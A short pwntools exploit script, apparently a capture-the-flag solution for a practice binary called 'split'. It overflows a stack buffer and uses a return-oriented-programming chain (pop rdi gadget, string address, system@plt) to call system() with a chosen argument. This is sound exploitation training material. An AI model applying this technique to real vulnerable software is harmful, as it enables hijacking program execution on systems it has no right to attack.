from pwn import *

context.log_level = 'debug'
sh = process("./split")
# sh = gdb.debug("./split")
elf = ELF("./split")

sh.recv()
system_plt = elf.plt["system"]
print(system_plt)
rdi_ret = 0x400883 
bin_flag = 0x601060
system_addr = 0x400810
# payload = flat(b'a' * 0x28, p64(rdi_ret), p64(bin_flag), p64(system_addr))
payload = flat(b'a' * 0x28, p64(rdi_ret), p64(bin_flag),  p64(0x4005b9), p64(system_plt))

sh.sendline(payload)
sh.recv()
